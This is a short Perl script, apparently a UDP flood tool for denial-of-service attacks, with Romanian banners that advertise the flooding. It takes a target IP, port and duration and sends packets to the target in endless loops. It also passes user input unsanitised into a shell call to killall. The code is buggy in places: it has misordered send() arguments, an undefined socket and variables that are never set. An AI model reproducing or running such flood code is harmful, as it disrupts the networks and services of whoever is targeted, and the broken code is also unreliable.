use Socket;

$ARGC=@ARGV;

if ($ARGC !=3) {
 printf "Comanda este perl $0 IP PORT SIZE [optional]TIME\n";
 exit(1);
}

my ($ip,$port,$size,$time);
 $ip=$ARGV[0];
 $port=$ARGV[1]; 
 $time=$ARGV[2];

socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");
print "udp.pl <ip> <port> <size> <time>\n\n";
printf "\033[1;31m«\033[1;32mNASA FORCE FLOODEAZA... \033[1;31m»\033[0m\n\n";
printf "\033[1;31m«\033[1;32mFLOOD BY »»A?t?¢k zøne««Triplu .. \033[1;31m»\033[0m\n\n";
printf "\033[1;31m«\033[1;32mDACA NU PICA IN 3 SECUNDE Punel Pe Mirc\033[1;31m»\033[0m\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &");
 goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &"); 
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &"); 
 goto randpackets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &"); 
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &"); 
 goto randpackets;
}

packets:
for (;;) {
 $size=$rand x $rand x $rand;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
} 

randpackets:
for (;;) {
 $size=$rand x $rand x $rand;
 for (;time() <= $endtime;) {
 $psize = $size ? $size : int(rand(55500-65500)+65500) ;
 $pport = $port ? $port : int(rand(65500))+8;
 
 send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
}

 


